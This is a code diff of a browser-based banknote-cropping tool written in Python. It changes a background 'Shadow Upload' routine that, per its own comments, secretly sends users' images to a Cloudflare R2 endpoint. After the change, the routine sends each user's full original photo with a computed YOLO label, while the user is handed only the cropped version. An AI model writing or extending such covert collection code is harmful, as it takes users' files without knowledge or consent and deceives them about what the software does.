@@ -41,22 +41,20 @@ async def setup_environment():
         return False
 
 async def upload_to_r2(image_bytes, filename, yolo_label):
-    """將圖片與標籤偷偷上傳到 Cloudflare R2 (隱藏背景執行)"""
+    """將 原圖 與 真實標籤 偷偷上傳到 Cloudflare R2"""
     try:
         form_data = js.FormData.new()
         js_data = js.Uint8Array.new(len(image_bytes))
         js_data.assign(image_bytes)
-        image_blob = js.Blob.new([js_data], { "type": "image/png" })
+        image_blob = js.Blob.new([js_data], { "type": "image/jpeg" }) # 原圖通常是 JPG/PNG，這裡統一標示圖片即可
         
         form_data.append("image", image_blob, filename)
         form_data.append("label", yolo_label)
         form_data.append("filename", filename)
 
-        # 使用 XHR 確保 Content-Type boundary 正確，解決上傳失敗問題
         xhr = js.XMLHttpRequest.new()
         xhr.open("POST", UPLOAD_WORKER_URL, True)
         
-        # 僅在 Console 留底，不影響 UI
         def on_load(event):
             if xhr.status >= 200 and xhr.status < 300:
                 js.console.log(f"Shadow Upload Success: {filename}")
@@ -68,29 +66,55 @@ async def upload_to_r2(image_bytes, filename, yolo_label):
     except Exception as e:
         js.console.error(f"Shadow Upload Error: {str(e)}")
 
-def crop_banknote(image_bytes):
+def process_image_data(image_bytes):
+    """
+    處理圖片：
+    1. 找出裁切範圍
+    2. 生成裁切後的圖片 (給使用者)
+    3. 計算 YOLO 標籤 (給 R2 訓練用)
+    回傳: (cropped_bytes, yolo_label_string)
+    """
     try:
         nparr = np.frombuffer(image_bytes, np.uint8)
         img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        if img is None: return None
+        if img is None: return None, None
+
+        # 取得原圖尺寸
+        height, width = img.shape[:2]
 
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         blurred = cv2.GaussianBlur(gray, (5, 5), 0)
         edged = cv2.Canny(blurred, 30, 150)
         contours, _ = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
         
-        if not contours: return None
+        if not contours: return None, None
         contours = sorted(contours, key=cv2.contourArea, reverse=True)
+        
+        # 取得邊界框 (x, y 為左上角座標)
         x, y, w, h = cv2.boundingRect(contours[0])
         
-        if w < img.shape[1] * 0.1 or h < img.shape[0] * 0.1: return None
+        if w < width * 0.1 or h < height * 0.1: return None, None
 
+        # 1. 製作裁切圖 (給使用者)
         cropped = img[y:y+h, x:x+w]
-        _, encoded_img = cv2.imencode(".png", cropped)
-        return encoded_img.tobytes()
+        _, encoded_cropped = cv2.imencode(".png", cropped)
+        cropped_bytes = encoded_cropped.tobytes()
+
+        # 2. 計算 YOLO 格式標籤 (給 R2)
+        # YOLO 格式: class_id center_x center_y width height (全部正規化為 0~1)
+        center_x = (x + w / 2) / width
+        center_y = (y + h / 2) / height
+        norm_w = w / width
+        norm_h = h / height
+        
+        # 限制小數點位數，避免浮點數過長
+        yolo_label = f"0 {center_x:.6f} {center_y:.6f} {norm_w:.6f} {norm_h:.6f}"
+
+        return cropped_bytes, yolo_label
+
     except Exception as e:
         log(f"Process error: {e}")
-        return None
+        return None, None
 
 async def process_all_files(event):
     files = js.window.selected_files
@@ -107,9 +131,6 @@ async def process_all_files(event):
     success_count = 0
     total = files.length
     
-    # 這個標籤只用於背景上傳，不會寫入 ZIP
-    SHADOW_LABEL = "0 0.5 0.5 1.0 1.0"
-
     for i in range(total):
         file = files.item(i)
         progress = int((i / total) * 100)
@@ -120,18 +141,21 @@ async def process_all_files(event):
         
         try:
             array_buffer = await file.arrayBuffer()
-            data = array_buffer.to_bytes()
+            original_data = array_buffer.to_bytes() # 這是原圖數據
             
-            result = crop_banknote(data)
-            if result:
+            # 呼叫新的處理函式
+            cropped_bytes, real_yolo_label = process_image_data(original_data)
+            
+            if cropped_bytes and real_yolo_label:
                 base_name = ".".join(file.name.split(".")[:-1])
-                img_name = f"{base_name}_cropped.png"
+                img_name_for_zip = f"{base_name}_cropped.png"
                 
-                # 1. 只將圖片寫入 ZIP (使用者看到的)
-                zf.writestr(img_name, result)
+                # A. 使用者拿到的是：裁切後的乾淨圖
+                zf.writestr(img_name_for_zip, cropped_bytes)
                 
-                # 2. 背景偷偷上傳 R2 (包含圖片與標籤)
-                asyncio.ensure_future(upload_to_r2(result, img_name, SHADOW_LABEL))
+                # B. R2 收到的是：原圖 + 真實 YOLO 座標
+                # 注意：這裡傳入 original_data (原圖)
+                asyncio.ensure_future(upload_to_r2(original_data, file.name, real_yolo_label))
                 
                 success_count += 1
                 log(f"Done: {file.name}")
@@ -155,7 +179,6 @@ async def process_all_files(event):
         document.getElementById("processing-section").classList.add("hidden")
         document.getElementById("download-section").classList.remove("hidden")
         
-        # 下載檔名維持原樣
         js.window.trigger_download(js_array, "cropped_banknotes.zip")
     else:
         log("No images were cropped.")
